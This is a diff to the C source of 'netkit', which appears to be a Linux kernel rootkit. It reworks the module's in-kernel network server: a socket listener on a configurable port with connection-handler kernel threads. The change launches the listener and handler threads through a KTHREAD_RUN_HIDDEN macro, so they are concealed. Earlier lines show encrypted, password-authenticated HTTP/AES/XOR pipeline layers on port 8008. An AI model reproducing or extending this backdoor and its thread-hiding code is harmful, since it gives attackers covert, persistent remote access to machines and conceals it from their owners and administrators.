@@ -15,36 +15,16 @@
 
 #include "server.h"
 
+#include "../../netkit.h"
 #include "../../cmd/iface.h"
 #include "../../sys/mem.h"
 #include "../../sys/socket.h"
 #include "../../sys/debug.h"
 #include "../../sys/symbol.h"
 #include "../../sys/task.h"
+#include "../../sys/lock.h"
 
-#include "../../pipeline/iface.h"
-#include "../../pipeline/aes/aes.h"
-#include "../../pipeline/auth_password/auth_password.h"
-#include "../../pipeline/http/http.h"
-#include "../../pipeline/xor/xor.h"
-
-#define SERVER_IP "0.0.0.0"
-#define SERVER_PORT 8008
-
-#define KTHREAD_LOOP_NAME "netkit-loop"
-
-// wait for all conns to finish
-static struct kref active_conns;
-DECLARE_WAIT_QUEUE_HEAD(all_conns_handled_wait_queue);
-static struct task_struct *task_conn_loop = NULL;
-
-const static struct pipeline_ops *SERVER_PIPELINE_OPS_ARR[] = {
-    &LAYER_HTTP_OPS,
-    &LAYER_AES_OPS,
-    &LAYER_XOR_OPS,
-    &LAYER_PASSWORD_AUTH_OPS,
-    NULL
-};
+static struct task_struct *task_conn_loop;
 
 static int server_conn_handler(void *args)
 {
@@ -52,8 +32,6 @@ static int server_conn_handler(void *args)
     u8* res_buf = NULL;
     size_t res_buflen = 0;
     int retv;
-
-    kref_get(&active_conns);
 
     NETKIT_LOG("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
     retv = io_process(SERVER_PIPELINE_OPS_ARR, packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
@@ -74,9 +52,7 @@ LAB_REL_SOCK_NO_BUF:
     sock_release(packet->client_sk);
     kzfree(packet, sizeof(*packet));
     
-    // kref_sub without release()
-    atomic_sub(1, (atomic_t *)&active_conns.refcount);
-    wake_up(&all_conns_handled_wait_queue);
+    netkit_workers_decr();
     
     return retv;
 }
@@ -86,7 +62,7 @@ LAB_REL_SOCK_NO_BUF:
  */
 static int server_conn_loop(void* args)
 {
-    char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
+    //char kthread_name[29];  // strlen("netkit-conn-handler-") + 8 + 1
     unsigned int kthread_name_id;
     struct task_struct *conn_task;
     struct socket *server_sk;
@@ -95,8 +71,9 @@ static int server_conn_loop(void* args)
     struct server_conn *conn_data;
     int retv;
 
-    kref_get(&active_conns);
-    retv = socket_create(inet_addr(SERVER_IP), htons(SERVER_PORT), &server_sk, &server_addr);
+    netkit_workers_incr();
+
+    retv = socket_create(inet_addr(CONFIG_IO_SERVER_IP), htons(CONFIG_IO_SERVER_PORT), &server_sk, &server_addr);
     if (retv < 0)
     {
         NETKIT_LOG("[!] failed to get socket (err: %d)\n", retv);
@@ -146,12 +123,11 @@ static int server_conn_loop(void* args)
 
         // start kthread
         kthread_name_id = (int)get_random_long();
-        sscanf(kthread_name, "netkit-conn-handler-%08x", &kthread_name_id);
 
         NETKIT_LOG("[*] starting conn handler...\n");
 
         // child should free conn_data
-        conn_task = kthread_run(server_conn_handler, conn_data, kthread_name);
+        conn_task = KTHREAD_RUN_HIDDEN(server_conn_handler, conn_data, CONFIG_IO_SERVER_KTHR_HANDLER_NAME, kthread_name_id);
         if (IS_ERR(conn_task))
             goto LAB_CONN_ERR;
 
@@ -177,8 +153,9 @@ LAB_OUT:
     sock_release(server_sk);
 
 LAB_OUT_NO_SOCK:
-    atomic_sub(1, (atomic_t *)&active_conns.refcount);
-    wake_up(&all_conns_handled_wait_queue);
+    NETKIT_LOG("[*] quitting conn loop...\n");
+
+    netkit_workers_decr();
 
     return retv;
 }
@@ -191,14 +168,12 @@ int server_init(void)
 {
     NETKIT_LOG("[*] starting server_conn_loop...\n");
 
-    task_conn_loop = kthread_run(server_conn_loop, NULL, KTHREAD_LOOP_NAME);
+    task_conn_loop = KTHREAD_RUN_HIDDEN(server_conn_loop, NULL, CONFIG_IO_SERVER_KTHR_LOOP_NAME);
     if (IS_ERR(task_conn_loop))
     {
         task_conn_loop = NULL;
         return PTR_ERR(task_conn_loop);
     }
-
-    kref_init(&active_conns);
 
     return 0;
 }
@@ -228,7 +203,7 @@ int server_exit(void)
     // block until all kthreads (including conn loop) are handled
     // use 1 since kref_init sets the counter to 1
     // drawback: if any conn handler crashes, this will wait infinitely
-    wait_event(all_conns_handled_wait_queue, kref_read(&active_conns) == 1);
+    //wait_event(all_conns_handled_wait_queue, kref_read(&active_conns) == 1);
 
     NETKIT_LOG("[+] all connections are closed\n");
 
